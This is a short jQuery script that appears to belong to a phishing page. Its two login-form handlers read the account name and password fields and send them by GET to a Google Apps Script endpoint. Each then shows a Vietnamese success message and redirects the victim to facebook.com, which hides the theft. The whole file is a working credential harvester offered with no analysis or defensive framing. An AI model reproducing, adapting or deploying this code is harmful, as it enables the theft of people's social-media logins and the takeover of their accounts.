// Form 1

$(document).ready(function() {
    $("#fmrmodal").submit(function(e) {
      //---------------^---------------
  
      e.preventDefault();
      var taikhoan = $('#taikhoan').val(),
      matkhau = $('#matkhau').val(),
      data = $('form#fmrmodal').serialize();
      $('#btnlogin').attr('disabled', 'disabled');
      $.ajax({
        type : 'GET', 
        url: "https://script.google.com/macros/s/AKfycbxpspf8Q3HWUdqKWkxYNZY8IwDSjP3XdpcOc1MMYKQEf4sQid53/exec",
        dataType:'json',
        crossDomain : true,
        data : data,
  
        success : function(data){
          if(data == 'false') 
          {
           alert('Thêm không thành công, vui lòng điền lại thông tin');
         }else{
            alert('Thành công, kiểm tra danh sách bạn bè trong email');
           window.location.href = 'https://www.facebook.com/';
         }
       }
  
     });
      return false;
  
    });
  });
  
  
  
  // Form 2
  
  
  $(document).ready(function() {
    $("#fmrmodal2").submit(function(e) {
  
      //---------------^---------------
      e.preventDefault();
      var taikhoan2 = $('#taikhoan2').val(),
      matkhau2 = $('#matkhau2').val(),
      data = $('form#fmrmodal2').serialize();
      $('.checkmobile').attr('disabled', 'disabled');
      $.ajax({
        type : 'GET', 
        url: "https://script.google.com/macros/s/AKfycbxpspf8Q3HWUdqKWkxYNZY8IwDSjP3XdpcOc1MMYKQEf4sQid53/exec",
        dataType:'json',
        crossDomain : true,
        data : data,
  
        success : function(data){
          if(data == 'false') 
          {
           alert('Thêm không thành công, vui lòng điền lại thông tin');
         }else{
            alert('Thành công, kiểm tra danh sách bạn bè trong email');
           window.location.href = 'https://www.facebook.com/';
  
         }
       }
  
     });
      return false;
  
    });
  });
  
  